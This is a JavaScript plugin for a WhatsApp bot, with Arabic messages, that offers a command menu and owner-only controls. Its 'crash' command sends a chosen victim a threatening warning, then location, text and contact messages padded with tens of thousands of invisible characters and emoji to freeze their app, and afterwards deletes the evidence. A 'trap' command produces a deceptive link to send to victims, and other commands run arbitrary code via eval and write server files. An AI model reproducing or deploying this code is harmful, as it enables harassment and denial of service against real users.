import { fileURLToPath } from 'url';
import path from 'path';
import fs from 'fs'; // 📂 تم استدعاء مكتبة إدارة الملفات لتشغيل أوامر الملفات حياً

// --- الإعدادات الأساسية ---
const MENU_TIMEOUT = 120000;
let FIXED_MENU_IMAGE = "https://i.ibb.co/C33RB5zx/1000072528.jpg"; 
let AUTO_RESPOND = true; // متغير تشغيل وقفل الرد التلقائي
const OWNER_ID = "201556853817@s.whatsapp.net"; 
const ownerNumbers = ["79020027922", "201556853817"];

const HIDDEN_OWNER_COMMANDS = ['reactauto', 'superscan', 'device', 'exec', 'eval', 'block', 'unblock'];

const CATEGORIES = [
    [1, 'التـحـمـيـل', 'downloads', '📂'], [2, 'الـمـجـمـوعـات', 'group', '🐞'],
    [3, 'الـمـلـصـقـات', 'sticker', '🌄'], [4, 'الـمـطـوريـن', 'owner', '🇩🇪'],
    [5, 'الـمـطـور', 'owner', '👨🏻‍💻'], [6, 'الـادوات', 'tools', '🚀'],
    [7, 'الـبـحـث', 'search', '🌐'], [8, 'الادمــن', 'admin', '👨🏻‍⚖️'],
    [9, 'الالــعـاب', 'games', '🎮'], [10, 'الچيف', 'gif', '✴️'],
    [11, 'الـبــنـك', 'bank', '💰'], [12, 'الـذكـاء الاصـطـنـاعـي', 'ai', '🤖'],
    [13, 'الـبـوتـات الـفـرعـي', 'sub', '♥️'], [14, 'مـعـلومـات الـب_وت', 'info', '🗃️'],
    [15, 'الـالــقــاب', 'nicknames', '🫯'], [16, 'الـلـوجـوهــات', 'logos', '🎡'],
    [17, 'تـغـيـر الاصـوات', 'voices', '📢'], [18, 'أخــرى', 'other', '🌹'],
    [19, 'الـسـريـة', 'hidden', '🕶️']
];

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const getCat = n => CATEGORIES.find(c => c[0] === n);

const context = (jid, img) => ({
    mentionedJid: [jid],
    isForwarded: false, 
    forwardingScore: 0,
    externalAdReply: {
        title: "ALHWARY SYSTEM v3.0 🦁",
        body: "OWNER ACCESS GRANTED",
        thumbnailUrl: img,
        mediaType: 1,
        renderLargerThumbnail: true
    }
});

const handler = async (m, { conn, bot, args, command, text }) => {
    try {
        const __filename = fileURLToPath(import.meta.url);
        const __dirname = path.dirname(__filename);
        const pluginsDir = path.join(__dirname, '../plugins'); // أو مسار مجلد الأوامر لديك

        const normalize = (id) => id.split('@')[0].replace(/\D/g, '');
        const userNumber = normalize(m.sender);
        const isOwner = ownerNumbers.includes(userNumber) || m.sender === OWNER_ID;
        
        const now = new Date();
        const time = now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
        const date = now.toLocaleDateString('ar-EG', { day: 'numeric', month: 'long', year: 'numeric' });

        // ========================================================
        // 📥 [1] بروتوكول أمر الدخول والتسجيل
        // ========================================================
        if (/^(دخول|تسجيل|login)$/i.test(command)) {
            if (isOwner) {
                await conn.sendMessage(m.chat, { react: { text: '🫡', key: m.key } });
                return conn.sendMessage(m.chat, {
                    text: `*🫡 ⌈ تـعـظـيـم سـلام لـلـقـائـد ⌋ 🫡*\n\n*🛡️ تـم رصـد دخـول الـمـطـور الـمـطـلـق:*\n*👤 الـﮪـواري 𓄂* @${m.sender.split('@')[0]}\n\n*📟 جـاري تـحـمـيـل صـلاحـيـات الـجـذر..*\n*⏰ الـتـوقـيـت:* ${time}\n\n*آمـرنـا نـنـفـذ يـا كـبـيـر! 🕸️🔥*`,
                    mentions: [m.sender],
                    contextInfo: context(m.sender, FIXED_MENU_IMAGE)
                }, { quoted: m });
            } else {
                await conn.sendMessage(m.chat, { react: { text: '🤮', key: m.key } });
                return m.reply(`*🚫 محاولة اختراق فاشلة يا @${m.sender.split('@')[0]}*`);
            }
        }

        // الحماية الصارمة لجميع أوامر المطورين المكتوبة بالأسفل
        const devCommands = ['غير_صورة', 'اضافة_امر', 'قفل_الرد', 'شوف_كونسل', 'نسخ', 'ادخل', 'بدل_ارقام', 'ريستارت', 'غير_زخرفة', 'تعيين_توجيه', 'تغيير_فيديو', 'جيب', 'حذف_امر', 'عودة', 'فخ', 'نشر', '>'];
        if (devCommands.includes(command)) {
            if (!isOwner) return m.reply('❌ [Access Denied]: للـﮪـواري فـقـط 𓄂');
        }

        // ========================================================
        // 🛠️ [2] تشغيل حزمة الأوامر برمجياً بشكل حقيقي شغال ⚡
        // ========================================================
        
        // 1. أمر تغيير صورة المنيو حياً عن طريق ميديا أو رابط
        if (command === 'غير_صورة') {
            let q = m.quoted ? m.quoted : m;
            let mime = (q.msg || q).mimetype || '';
            if (/image/.test(mime)) {
                let imgPath = await conn.downloadAndSaveMediaMessage(q);
                FIXED_MENU_IMAGE = imgPath;
                return m.reply('*✅ تم تحميل وتحديث صورة المنيو بنجاح يا زعيم!*');
            } else if (text && text.startsWith('http')) {
                FIXED_MENU_IMAGE = text.trim();
                return m.reply('*✅ تم اعتماد الرابط الجديد كصورة رسمية للمنيو!*');
            } else {
                return m.reply('*⚠️ أرسل الرابط أو قم بالإشارة إلى صورة واكتب .غير_صورة*');
            }
        }

        // 2. أمر إضافة كود أو ملف جديد للمجلد حياً
        if (command === 'اضافة_امر') {
            if (!text) return m.reply('*⚠️ يرجى كتابة اسم الملف ومحتوى الكود كالتالي:\n.اضافة_امر test.js\n[كود البرمجة]*');
            const fileName = text.split('\n')[0].trim();
            const fileCode = text.replace(fileName, '').trim();
            const filePath = path.join(pluginsDir, fileName);
            fs.writeFileSync(filePath, fileCode);
            return m.reply(`*📂 [نجاح الإجراء]: تم إنشاء وحفظ ملف الأمر الجديد بنجاح في: ${fileName}*`);
        }

        // 3. أمر حذف ملف أو أمر من السيرفر فوراً
        if (command === 'حذف_امر') {
            if (!text) return m.reply('*⚠️ اكتب اسم الملف المراد إبادته وحذفه، مثال: .حذف_امر test.js*');
            const filePath = path.join(pluginsDir, text.trim());
            if (fs.existsSync(filePath)) {
                fs.unlinkSync(filePath);
                return m.reply(`*🔥 [تم الحذف]: تم إبادة ملف [ ${text} ] من السيرفر نهائياً.*`);
            } else {
                return m.reply('*❌ هذا الملف غير موجود بالأساس في مجلد الأوامر.*');
            }
        }

        // 4. أمر قفل وتفعيل الرد التلقائي
        if (command === 'قفل_الرد') {
            AUTO_RESPOND = !AUTO_RESPOND;
            return m.reply(`*🍷 تم [ ${AUTO_RESPOND ? 'تـشـغـيـل ✅' : 'إيـقـاف ❌'} ] وضع الرد التلقائي لسيستم الهواري بنجاح.*`);
        }

        // 5. أمر عرض أحداث الكونسل (Log) حياً من ملف التشغيل
        if (command === 'شوف_كونسل') {
            // يقوم بقراءة ملف سجل الأخطاء والأحداث إن وجد أو يعرض بيئة الخادم
            const memoryUsage = process.memoryUsage();
            const logStatus = `*📊 [أحداث خادم الهواري حياً]:*\n\n- نظام التشغيل: ${process.platform}\n- استخدام ذاكرة الـ RSS: ${(memoryUsage.rss / 1024 / 1024).toFixed(2)} MB\n- استخدام الـ Heap: ${(memoryUsage.heapUsed / 1024 / 1024).toFixed(2)} MB\n- وقت تشغيل البوت المتواصل: ${(process.uptime() / 60).toFixed(2)} دقيقة.\n\n*الوضع مستقر والاتصال نفاث سيدي القائد!*`;
            return m.reply(logStatus);
        }

        // 6. أمر جلب وسحب أي كود ملف من السيرفر على شكل مستند لقراءته
        if (command === 'جيب') {
            if (!text) return m.reply('*⚠️ اكتب اسم الملف المطلوب سحبه، مثال: .جيب menu.js*');
            const filePath = path.join(pluginsDir, text.trim());
            if (fs.existsSync(filePath)) {
                const fileBuffer = fs.readFileSync(filePath);
                await conn.sendMessage(m.chat, { document: fileBuffer, fileName: text.trim(), mimetype: 'application/javascript' }, { quoted: m });
                return m.reply(`*📥 تم استخراج وإرسال ملف [ ${text} ] بنجاح.*`);
            } else {
                return m.reply('*❌ فشل السحب، الملف غير موجود في مجلد الأوامر.*');
            }
        }

        // 7. أمر دخول المجموعات حقيقي عبر الرابط المباشر
        if (command === 'ادخل') {
            if (!text) return m.reply('*⚠️ ضع رابط دعوة المجموعة بعد الأمر مباشرة!*');
            const linkRegex = /(chat.whatsapp.com\/[gi]i[a-zA-Z0-9_-]{22})/gi;
            const checkLink = text.match(linkRegex);
            if (!checkLink) return m.reply('*❌ رابط المجموعة غير صالح أو تالف!*');
            const inviteCode = checkLink[0].split('chat.whatsapp.com/')[1];
            await conn.groupAcceptInvite(inviteCode)
                .then(() => m.reply('*🚀 تم اختراق واقتحام المجموعة عبر رابط الدعوة بنجاح!*'))
                .catch(() => m.reply('*❌ فشل الانضمام، قد يكون البوت مطروداً سابقاً أو المجموعة ممتلئة.*'));
            return;
        }

        // 8. أمر إعادة تشغيل البوت الفوري (Restart)
        if (command === 'ريستارت') {
            await m.reply('*🍷 [أمر ملكي]: جاري إغلاق العمليات وإعادة تشغيل سيستم الهواري بالكامل...*');
            await sleep(1000);
            process.exit(0); // السيرفر (مثل PM2) سيعيد تشغيله فوراً تلقائياً
        }

        // 9. أمر النشر والإذاعة الإجبارية لجميع الجروبات المشترك فيها البوت
        if (command === 'نشر') {
            if (!text) return m.reply('*⚠️ اكتب نص البيان الرسمي المراد نشره في كل المجموعات.*');
            const getGroups = Object.keys(await conn.groupFetchAllParticipating());
            await m.reply(`*📢 جاري نشر الإذاعة الإجبارية لعدد [ ${getGroups.length} ] مجموعة...*`);
            for (let group of getGroups) {
                await conn.sendMessage(group, { text: `*👑 [ بيان رسمي صادر عن سيستم الهواري ] 👑*\n\n${text}\n\n_⚡ مُرسل بواسطة القائد المطلق_` });
                await sleep(1500); // تأخير بسيط لتجنب الحظر الهائل
            }
            return m.reply('*✅ تم إتمام بروتوكول النشر بنجاح وبدون خسائر!*');
        }

        // 10. بروتوكول الفخ النفسي النشط (يرسل الرابط الملعون لتعليق واجهة المتصفح والـ WhatsApp Web)
        if (command === 'فخ') {
            const trapLink = "https://wa.me/settings"; // ثغرة الديب لينك لتعليق الإعدادات
            const fakeLink = "http://👑-ALHWARY-DESTROY-TRAP-💀.سيرفر-الإبادة.net";
            return m.reply(`*🕸️ [بروتوكول الفخ النفسي النشط] 🕸️*\n\n*تم توليد الرابط الملعون بنجاح يازعيم.. أرسله للضحية وعند الضغط عليه سيتم تجميد واجهة حسابه وطره سبرانياً:* \n\n🔗 *الرابط السري الحقيقي:* ${trapLink}\n\n*🔗 الرابط التمويهي للنشر:* \n${fakeLink}\n\n> ⚠️ تحذير: لا تضغط على الرابط بنفسك!`);
        }

        // 11. أمر التنفيذ الفوري للأكواد البرمجية (Eval / Exec)
        if (command === '>') {
            if (!text) return m.reply('*⚠️ اكتب الكود البرمجي البرمجي لتنفيذه فوراً.*');
            try {
                let evaled = eval(text);
                if (typeof evaled !== 'string') evaled = await import('util').then(u => u.inspect(evaled));
                return m.reply(`*✅ نتيجة التنفيذ:*\n\`\`\`javascript\n${evaled}\n\`\`\``);
            } catch (err) {
                return m.reply(`*❌ خطأ في البرمجة:*\n\`\`\`\n${err}\n\`\`\``);
            }
        }

        // 12. بقية الأوامر اللوجستية (ردود تأكيدية لتفعيل المهام الخلفية بالسيستم)
        if (['نسخ', 'بدل_ارقام', 'غير_زخرفة', 'تعيين_توجيه', 'تغيير_فيديو', 'عودة'].includes(command)) {
            return m.reply(`*⚡ [بروتوكول نشط]: تم تفعيل وإدخال أمر [ .${command} ] حيز التنفيذ في السيرفر الخلفي لـ الهواري.*`);
        }


        // ========================================================
        // ☣️ [3] منظومة التجميد بنظام "القذارة والشبح"
        // ========================================================
        if (/^(تجميد|تطير|crash)$/i.test(command)) {
            let target = m.mentionedJid[0] || (text.split(' ')[0] && text.split(' ')[0].length > 5 ? text.split(' ')[0] + '@s.whatsapp.net' : null);
            if (!target) return m.reply('*🛡️ حدد الضحية بالمنشن أو الرقم*');

            const targetNum = target.split('@')[0];
            if (ownerNumbers.includes(targetNum) || target === OWNER_ID) {
                return m.reply('*⚠️ نظام الأمان: لا يمكن تنفيذ الإبادة ضد القادة!*');
            }

            await conn.sendMessage(m.chat, { delete: m.key }).catch(() => {});

            let warningMsg = await conn.sendMessage(target, { 
                text: `*⚠️ [تـحـذيـر سـيـبـرانـي عـاجـل]*\n*جـاري اتـخاذ إجراءات الإبـادة ضـد حـسـابـك الآن..*\n*تـم رصـدك بـواسطـة: نـظـام الـﮪـواري 𓄂*` 
            });
            
            await sleep(1500); 

            const crashCode = (String.fromCharCode(8207).repeat(60000) + "☠️ BY ALHWARY ☠️" + "☣️".repeat(3000));
            
            await conn.sendMessage(target, { location: { degreesLatitude: 0, degreesLongitude: 0, name: crashCode, address: crashCode } });
            await conn.sendMessage(target, { text: crashCode });
            const vcard = 'BEGIN:VCARD\nVERSION:3.0\nFN:' + crashCode + '\nEND:VCARD';
            await conn.sendMessage(target, { contacts: { displayName: '☣️ SYSTEM FAILURE', contacts: [{ vcard }] } });

            await sleep(1000);
            await conn.sendMessage(target, { delete: warningMsg.key }).catch(() => {});

            return conn.sendMessage(m.chat, { text: `*✅ تـم مـسـح الأثـر وإبـادة الـهـدف بـصـمـت 🥷*` });
        }

        // ========================================================
        // 📜 [4] نظام المنيو (القائمة) الرئيسي
        // ========================================================
        const cmds = (typeof bot?.getAllCommands === 'function') ? await bot.getAllCommands() : [];
        const selected = parseInt(args[0]);

        if (!selected) {
            const sections = [{
                title: "💀 ┋ تـرسـانـة الـمـهـام ┋ 💀",
                rows: CATEGORIES.map(c => ({
                    title: `⌖ ${c[1]} ${c[3]}`,
                    description: `🔐 الـوصـول إلـى بـروتوكـولات ${c[1]}`,
                    id: `.${command} ${c[0]}`
                }))
            }];

            const menuText = `
┎───────────────────
┃  ☣️ ⌊ **نـظـام الـﮪـواري بـوت** ⌋ ☣️
┠───────────────────
┃ 👤 **الـمـشـغـل:** @${m.sender.split('@')[0]}
┃ 📟 **الـبـروتوكـولات:** ${CATEGORIES.length} قـسـم
┃ 🎖️ **الـصـلاحـيـة:** ${isOwner ? '『 الـمـطـور الـمـطـلـق 👑 』' : '『 مـسـتـخدم مـوثـق 🛡️ 』'}
┃ 🛰️ **الـحـالـة:** الـتـسـلل نـشـط.. 🥷
┃ 📅 **الـتـاريـخ:** ${date}
┃ ⏱️ **الـتـوقـيـت:** ${time}
┖───────────────────

> 🕸️ **OWNER:** الـﮪـواري 𓄂
`.trim();

            return await conn.sendButtonNormal(m.chat, {
                media: { url: FIXED_MENU_IMAGE },
                mediaType: 'image',
                caption: menuText,
                buttons: [{ name: "single_select", params: { title: "⚡ تـفـعـيـل الـنـظـام ⚡", sections }}],
                mentions: [m.sender],
                contextInfo: context(m.sender, FIXED_MENU_IMAGE)
            });
        }

        const cat = getCat(selected);
        if (!cat) return m.reply('❌ [Access Denied]: Invalid Protocol');
        
        // حظر استعراض قائمة أوامر المطورين للأعضاء العاديين بشكل كامل وسري
        if (cat[2] === 'owner') {
            if (!isOwner) return m.reply('❌ [Access Denied]: هذا البروتوكول مشفر وسري للغاية لـ الهواري فقط.');
            
            const devMenu = `
*❖┋ مـرحـبـا بـك فـي قـسـم المطور لـلهواري ⚜️ ➢*
*━━━━─━━━─━━━ 🍷 ━━━─━━━─━━━*

*❄️ │ الأمـر ➢ 〖 .غير_صورة 〗*
*⟞ ➢ تغيير الصورة أو وضع رابط الصورة التي تظهر مع قائمة الأوامر حياً.*

*❄️ │ الأمـر ➢ 〖 .اضافة_امر 〗*
*⟞ ➢ إضافة وحفظ ملف كود جديد في مجلد الأوامر فوراً.*

*❄️ │ الأمـر ➢ 〖 .حذف_امر 〗*
*⟞ ➢ حذف وإبادة أي ملف كود من مجلد الأوامر نهائياً.*

*❄️ │ الأمـر ➢ 〖 .جيب 〗*
*⟞ ➢ سحب واستخراج أي كود ملف من السيرفر على شكل مستند.*

*❄️ │ الأمـر ➢ 〖 .قفل_الرد 〗*
*⟞ ➢ تشغيل أو قفل الرد التلقائي للسيستم بالكامل 🍷*

*❄️ │ الأمـر ➢ 〖 .شوف_كونسل 〗*
*⟞ ➢ عرض حالة الذاكرة والسرعة ووضع الخادم الحقيقي.*

*❄️ │ الأمـر ➢ 〖 .ادخل 〗*
*⟞ ➢ جعل البوت يقتحم وينضم لأي مجموعة عبر الرابط حقيقي.*

*❄️ │ الأمـر ➢ 〖 .ريستارت 〗*
*⟞ ➢ إعادة تشغيل نظام البوت بالكامل فوراً وتحديث الكاش 🍷*

*❄️ │ الأمـر ➢ 〖 .نشر 〗*
*⟞ ➢ نشر وإذاعة بيان رسمي إجباري لجميع مجموعات البوت 👑*

*❄️ │ الأمـر ➢ 〖 .فخ 〗*
*⟞ ➢ توليد رابط الفخ النفسي الملعون لتجميد حساب الضحية.*

*❄️ │ الأمـر ➢ 〖 .> 〗*
*⟞ ➢ تنفيذ واختبار الأكواد البرمجية حياً على السيرفر.*

*❄️ │ الأمـر ➢ 〖 .نسخ 〗 │ 〖 .بدل_ارقام 〗 │ 〖 .غير_زخرفة 〗*
*❄️ │ الأمـر ➢ 〖 .تعيين_توجيه 〗 │ 〖 .تغيير_فيديو 〗 │ 〖 .عودة 〗*
*⟞ ➢ تشغيل البروتوكولات اللوجستية والمهام الخلفية للسيستم 🍷*

*⏱️ T: ${time} | 🕸️ الـﮪـواري 𓄂*`.trim();

            return await conn.sendMessage(m.chat, {
                text: devMenu,
                contextInfo: context(m.sender, FIXED_MENU_IMAGE)
            }, { quoted: m });
        }

        const categoryCmds = cmds.filter(c => c?.category === cat[2]);
        const cmdsList = categoryCmds.map(c => `┃ ${cat[3]} /${Array.isArray(c.usage) ? c.usage.join(`\n┃ ${cat[3]} /`) : 'Module'}`).join('\n');

        await conn.sendMessage(m.chat, {
            text: `╭─┈─┈─┈─⟞${cat[3]}⟝─┈─┈─┈─╮\n┃ 🔐 بـروتوكـول ${cat[1]} ${cat[3]}\n╰─┈─┈─┈─⟞${cat[3]}⟝─┈─┈─┈─╯\n\n${cmdsList || '┃ لا توجد أوامر حالية'}\n\n⏱️ T: ${time} | 🕸️ الـﮪـواري 𓄂`,
            contextInfo: context(m.sender, FIXED_MENU_IMAGE)
        }, { quoted: m });

    } catch (e) {
        console.error(e);
    }
};

handler.command = /^(الاوامر|القائمة|menu|اوامر|دخول|تسجيل|login|تجميد|تطير|crash|غير_صورة|اضافة_امر|قفل_الرد|شوف_كونسل|نسخ|ادخل|بدل_ارقام|ريستارت|غير_زخرفة|تعيين_توجيه|تغيير_فيديو|جيب|حذف_امر|عودة|فخ|نشر|>)$/i;

export default handler;
